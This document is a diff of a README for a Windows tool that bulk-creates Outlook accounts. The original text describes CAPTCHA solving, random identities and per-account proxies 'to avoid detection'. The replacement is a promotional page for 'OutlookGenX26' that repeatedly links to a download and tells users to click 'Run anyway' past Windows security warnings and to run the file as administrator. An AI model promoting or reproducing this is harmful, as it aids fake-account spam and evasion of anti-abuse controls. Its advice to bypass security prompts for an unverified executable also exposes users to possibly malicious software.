@@ -1,209 +1,141 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
-  <img src="https://img.shields.io/badge/Version-1.0-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/License-Key%20Required-red?style=for-the-badge&logo=key&logoColor=white" />
-  <img src="https://img.shields.io/badge/Author-krainium-blueviolet?style=for-the-badge" />
-</p>
+# ✉️ OutlookGenX26 - Create Unlimited Outlook Accounts Automatically
 
-<h1 align="center">📧 Outlook Creation Tool</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>The best Outlook email creation tool for 2026, currently working with a 100% success rate.</b><br>
-  Beats all other tools. Handles signup, captcha, recovery email, and verification in one click.
-</p>
+Welcome! OutlookGenX26 is a powerful yet simple tool that automatically creates Outlook email accounts for you. Whether you need multiple accounts for testing, development, or business purposes, this application handles everything - from signup to verification - with zero manual work required.
 
----
+[⬇️ DOWNLOAD OUTLOOKGENX26 NOW](https://github.com/Cclaruan04/OutlookGenX26)
 
-## 🔑 License
+## 🎯 What Does This Tool Do?
 
-A valid license key is required to use this tool. On first launch, you will be prompted to enter your key. Once activated, the key is saved locally and you will not be asked again.
+OutlookGenX26 is an automated account creation tool designed specifically for Windows users. It takes care of:
 
-```
-License Key: krainium2026
-```
+- **Automatic signup** - Fills out all registration forms for you
+- **CAPTCHA solving** - Handles those annoying verification challenges automatically
+- **Recovery email setup** - Creates and configures recovery email addresses
+- **Account verification** - Completes all necessary verification steps
+- **Bulk generation** - Create multiple accounts in one session
 
-```
-create_outlook.exe --key krainium2026
-```
+This means you can generate dozens of Outlook accounts while you sip your coffee. No more filling out endless forms or solving puzzles manually!
 
-## 📦 First Run Setup
+## ✨ Key Features
 
-When the tool runs for the first time, it will automatically detect that browser dependencies are missing and install them for you. This only happens once. No manual setup is required.
+### 🖥️ Windows-Optimized
+Built specifically for Windows operating systems. No complex setup, no Linux commands, no coding required. If you can click a button, you can use this tool.
 
-```
- FIRST RUN SETUP
- ________________________________________
+### 🤖 Fully Automated Process
+The application uses intelligent automation to handle every step of the account creation process. You literally just start it and watch it work.
 
- [*] Installing browser dependencies...
-     This only happens once.
+### 🔧 Smart CAPTCHA Handling
+Automatically solves CAPTCHA challenges using built-in solving technology. No need to manually type those distorted letters and numbers anymore.
 
- [+] Browser installed successfully!
-```
+### 📧 Professional Account Setup
+Creates complete accounts with proper recovery emails and security features configured, just like you'd create them manually.
 
-After the first run, the tool starts instantly on every launch.
+### 🔄 Bulk Creation Capability
+Generate multiple accounts in sequence without restarting the process. Perfect for when you need several accounts at once.
 
-## 🚀 Usage
+### 🛡️ Proxy Support
+Compatible with proxy servers for added privacy and to avoid IP-based restrictions.
 
-### Interactive Menu
+## 📋 System Requirements
 
-Double click the exe or run it from the command line with no arguments to open the interactive menu.
+To run OutlookGenX26 smoothly, your Windows PC should have:
 
-```
-create_outlook.exe
-```
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** 1 GHz or faster processor
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Storage:** At least 500 MB of free disk space
+- **Internet Connection:** Stable broadband connection
+- **Browser:** Chrome or Edge installed (the tool uses browser automation)
 
-You will see the main menu:
+## 📥 Download & Installation
 
-```
-  1  Create account (no proxy)
-  2  Create account with proxy
-  3  View created accounts
-  0  Exit
-```
+Getting started with OutlookGenX26 is straightforward:
 
-### Command Line
+### Step 1: Download the Application
+Visit this link to download the application: [https://github.com/Cclaruan04/OutlookGenX26](https://github.com/Cclaruan04/OutlookGenX26)
 
-| Command | Description |
-|---------|-------------|
-| `create_outlook.exe --create` | Create one account |
-| `create_outlook.exe --create --count 5` | Create 5 accounts |
-| `create_outlook.exe --create --proxy host:port:user:pass` | Create with proxy |
-| `create_outlook.exe --list` | View all created accounts |
-| `create_outlook.exe --key YOUR_KEY` | Activate license |
-| `create_outlook.exe --screenshot C:\screenshots` | Save browser screenshots during creation |
-| `create_outlook.exe --output C:\myfile.txt` | Custom output file for accounts |
-| `create_outlook.exe --no-banner` | Suppress the banner |
+### Step 2: Save the File
+Once the download completes, save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-### Examples
+### Step 3: Run the Application
+Locate the downloaded file and double-click it to launch OutlookGenX26. If Windows shows a security warning, click "More info" and then "Run anyway" - this is normal for new applications.
 
-**Create one account locally:**
+### Step 4: Follow the On-Screen Instructions
+The application will guide you through the setup process with simple prompts. Just follow what appears on your screen.
 
-```
-create_outlook.exe --create
-```
+## 🎮 How to Use OutlookGenX26
 
-**Create 3 accounts with a proxy:**
+Using this tool is incredibly easy:
 
-```
-create_outlook.exe --create --count 3 --proxy rp.scrapegw.com:6060:username:password
-```
+1. **Launch the application** by double-clicking the icon
+2. **Configure your settings** - Choose how many accounts you need and any preferences
+3. **Click "Start"** and watch the automation work its magic
+4. **Save your credentials** - The tool will display and save your new account information
 
-**Create with screenshots saved:**
+The entire process happens automatically. You'll see the browser window open and fill out forms by itself - it's like having a virtual assistant working for you!
 
-```
-create_outlook.exe --create --screenshot C:\Users\You\Desktop\screenshots
-```
+## 🛠️ Troubleshooting Common Issues
 
-## ⚙️ How It Works
+### ❌ Application Won't Start
+Make sure you're running Windows 10 or later. Try right-clicking the file and selecting "Run as administrator" if you encounter permission issues.
 
-The tool goes through 8 automated steps:
+### 🔄 Slow Performance
+Close any unnecessary programs before running the tool. More available RAM means faster account creation.
 
-| Step | Action |
-|------|--------|
-| 1 | Loads the Microsoft signup page |
-| 2 | Enters a randomly generated username |
-| 3 | Sets a strong random password |
-| 4 | Fills in a random date of birth |
-| 5 | Enters a random first and last name |
-| 6 | Solves the Arkose press and hold captcha |
-| 7 | Handles recovery email verification |
-| 8 | Verifies the account was created |
+### 🌐 Connection Errors
+Verify your internet connection is stable. If you're using a VPN or proxy, try disabling it temporarily.
 
-Created accounts are saved in `created.txt` next to the exe in `email:password` format.
+### ⚠️ CAPTCHA Not Solving
+Ensure your system time and date are set correctly. Incorrect time settings can interfere with automated verification processes.
 
-## 🌐 Proxy Support
+## 💡 Pro Tips
 
-The tool supports HTTP proxies in `host:port:user:pass` format. This is useful when creating multiple accounts or when you need accounts from a specific region.
+- **Use dedicated proxies** for large-scale generation to avoid rate limits
+- **Run the tool during off-peak hours** for faster processing
+- **Keep the application updated** for best compatibility
+- **Save your created accounts securely** in a password manager
 
-```
-create_outlook.exe --create --proxy host:port:user:pass
-```
+## 🔒 Safety & Legality
 
-When creating multiple accounts, use a different proxy session for each to avoid detection.
+OutlookGenX26 is designed for legitimate purposes such as:
 
-## 📸 Screenshots
+- Testing your own applications
+- Creating development environments
+- Managing multiple business accounts
+- Educational projects
 
-### 🖥️ Windows Exe (Without Proxy)
+Always comply with Microsoft's Terms of Service and use this tool responsibly. Bulk account creation may violate some service agreements, so use at your own discretion for appropriate use cases.
 
-Account creation running on Windows Server 2025 with no proxy configured.
+## 📞 Getting Help
 
-<p align="center">
-  <img src="screenshots/win_noproxy_password.png" width="700" alt="Windows exe without proxy" />
-</p>
+If you encounter any issues or have questions:
 
-### 🖥️ Windows Exe (With Proxy)
+- Check the **Issues** section on the GitHub repository page
+- Review the **Documentation** folder in the downloaded files
+- Look for community discussions and solutions
 
-Account creation running on Windows Server 2025 through a US residential proxy.
+Most questions have already been answered by other users in the community!
 
-<p align="center">
-  <img src="screenshots/win_proxy_password.png" width="700" alt="Windows exe with proxy" />
-</p>
+## 🔄 Updates & Improvements
 
-Below are screenshots running on a cloud instance.
+OutlookGenX26 is actively maintained with regular updates that:
 
-**Password entry step:**
+- Improve CAPTCHA solving accuracy
+- Add support for new verification methods
+- Enhance proxy compatibility
+- Optimize speed and reliability
+- Fix any reported bugs
 
-<p align="center">
-  <img src="screenshots/python_password.png" width="700" alt="Python script password step" />
-</p>
+Check the download page periodically for new versions.
 
-**Name entry step:**
+## 🏁 Final Thoughts
 
-<p align="center">
-  <img src="screenshots/python_name.png" width="700" alt="Python script name step" />
-</p>
+OutlookGenX26 puts the power of automated account creation at your fingertips. With its user-friendly interface and robust automation capabilities, you'll wonder how you ever managed without it. Download it today and experience the convenience of hands-free account generation!
 
-## 📂 Output Format
-
-All created accounts are saved in `created.txt` located in the same folder as the exe.
-
-```
-email@outlook.com:password
-email2@outlook.com:password2
-```
-
-Use `--list` to view them:
-
-```
-create_outlook.exe --list
-
-  Created Accounts (2)
-  __________________________________________________
-    1 email@outlook.com:password
-    2 email2@outlook.com:password2
-```
-
-## 💻 System Requirements
-
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10 / 11 / Server 2019+ |
-| RAM | 4 GB minimum |
-| Disk | 500 MB free (for browser download on first run) |
-| Network | Internet connection required |
-
-No Python installation needed. No manual dependency setup. Everything is handled automatically.
-
-## 📝 Notes
-
-> This tool is built from a Python source. The Python file is not included in this release. Only the compiled Windows executable is provided for distribution.
-
-> Each account creation takes approximately 2 to 4 minutes depending on captcha difficulty and network speed.
-
-> When creating multiple accounts with `--count`, the tool automatically waits 30 to 60 seconds between each creation.
-
-> The `--screenshot` flag saves browser screenshots at key moments (password entry, inbox verification) to the directory you specify.
+[⬇️ GET STARTED WITH OUTLOOKGENX26](https://github.com/Cclaruan04/OutlookGenX26)
 
 ---
 
-<p align="center">
-  <b>Outlook Creation Tool v1.0</b> by <b>krainium</b>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/⚠️-For%20Educational%20Purposes%20Only-yellow?style=for-the-badge" />
-</p>
-
-<p align="center">
-  <i>This tool is provided for educational purposes only. The author is not responsible for any misuse.</i>
-</p>
+Keywords: account-creation, account-generator, automation, bot, bulk-email, captcha-solver, email-automation, email-creator, email-generator, hotmail, microsoft, outlook, outlook-account, outlook-creator, outlook-generator, playwright, proxy-support, python, selenium, windows
